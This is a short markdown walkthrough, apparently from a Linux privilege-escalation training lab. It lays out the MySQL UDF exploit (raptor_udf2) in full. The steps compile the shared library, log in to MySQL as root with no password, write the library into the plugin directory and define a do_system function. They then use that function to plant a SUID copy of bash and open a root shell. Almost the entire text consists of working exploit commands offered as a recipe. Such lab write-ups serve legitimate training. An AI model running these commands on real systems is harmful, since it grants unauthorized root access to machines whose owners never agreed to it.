# Privilege Escalation

#### Step 1 is to secure a shell

## Service Exploits
The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of <b>User Defined Functions (UDFs) </b>to run system commands as root via the MySQL service.<br>

- Change into the /home/user/tools/mysql-udf directory:<br>
<b>cd /home/user/tools/mysql-udf</b>

- Compile the raptor_udf2.c exploit code using the following commands:
<br>
<b>gcc -g -c raptor_udf2.c -fPIC<br>
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</b><br>

- Connect to the MySQL service as the root user with a blank password:
<br><b>mysql -u root</b><br>

- Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
<br><b>
use mysql;<br>
create table foo(line blob);<br>
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));<br>
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';<br>
create function do_system returns integer soname 'raptor_udf2.so';
</b><br>

- Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
<br><b>
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');</b><br>

- Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
<br><b>
/tmp/rootbash -p</b><br>

#### and we got a root

